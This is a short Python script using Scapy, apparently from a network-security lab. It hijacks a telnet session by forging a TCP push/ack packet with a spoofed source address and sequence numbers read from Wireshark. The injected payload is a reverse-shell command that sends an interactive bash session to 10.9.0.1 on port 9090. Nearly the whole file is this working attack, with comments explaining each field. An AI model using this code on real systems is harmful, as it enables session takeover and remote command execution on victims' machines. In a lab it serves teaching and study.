#!/usr/bin/env python3


from scapy.all import *

#IP is taken from wireshark, src is user who initiates telnet, dst is user who is being telnet to
ip = IP(src="10.9.0.6", dst="10.9.0.7") 
#sport is port of who initiates telnet, dport is port of who is being telnet to
#'PA' flags are the push and ack flags so the injected command is delivered immediately and packet is acked
#seq and number is the next expected sequence and ack number from wireshark
tcp = TCP(sport=51146, dport=23, flags="PA", seq=3911951572, ack=1736630231)
#data is where the command we want to execute is put
data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n" 
pkt = ip/tcp/data 
ls(pkt) 
send(pkt,iface="br-ef0aba4768f3",verbose=0) 
